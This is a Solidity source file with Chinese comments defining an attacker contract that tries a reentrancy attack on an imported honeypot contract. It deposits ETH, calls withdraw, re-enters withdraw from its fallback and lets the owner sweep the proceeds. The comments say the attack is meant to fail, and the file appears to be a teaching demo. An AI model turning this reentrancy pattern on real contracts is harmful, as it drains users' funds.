import "./HoneypotContract.sol";

/**
 * @title HoneypotAttacker
 * @dev 一个尝试攻击蜜罐合约的攻击合约
 * 这个合约会尝试利用看似存在的重入漏洞，但会失败
 */
contract HoneypotAttacker {
    HoneypotContract public honeypot;
    address public owner;
    
    constructor(address _honeypotAddress) {
        honeypot = HoneypotContract(_honeypotAddress);
        owner = msg.sender;
    }
    
    // 攻击函数
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        // 首先存入一些ETH
        honeypot.deposit{value: msg.value}();
        
        // 尝试通过重入攻击提取更多ETH
        honeypot.withdraw(msg.value);
    }
    
    // 回退函数用于重入攻击
    receive() external payable {
        // 如果还有余额，继续提取
        if (address(honeypot).balance >= 1 ether) {
            // 尝试重入攻击
            honeypot.withdraw(1 ether);
        }
    }
    
    // 允许所有者提取攻击获得的ETH
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}